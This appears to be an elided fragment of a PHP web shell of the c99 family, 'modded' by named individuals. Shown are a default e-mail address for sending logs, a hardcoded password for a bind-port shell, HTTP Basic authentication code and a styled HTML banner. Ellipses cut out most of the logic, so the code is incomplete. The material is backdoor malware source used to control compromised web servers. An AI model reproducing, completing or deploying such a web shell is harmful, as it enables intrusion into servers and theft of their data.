...
$log_email = "twicks@ua.fm"; //Default e-mail for sending logs
...
$bindport_pass = "Politican";  // default password for binding
...
if (!empty($login))
{
 ...
 if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
 {
  ...
  header("WWW-Authenticate: Basic realm=\"".$shver.": ".$login_txt."\"");
...
$ud = urlencode($d);
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title><?php echo getenv("HTTP_HOST"); ?></title><STYLE>
...
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[  <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>Modded by</b></u></a> 5niFra @ 9 . cn| <a href="http://khalidmoro.com"><font color="#FF0000">Mr KheniFri</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--</b></p></td></tr></table>
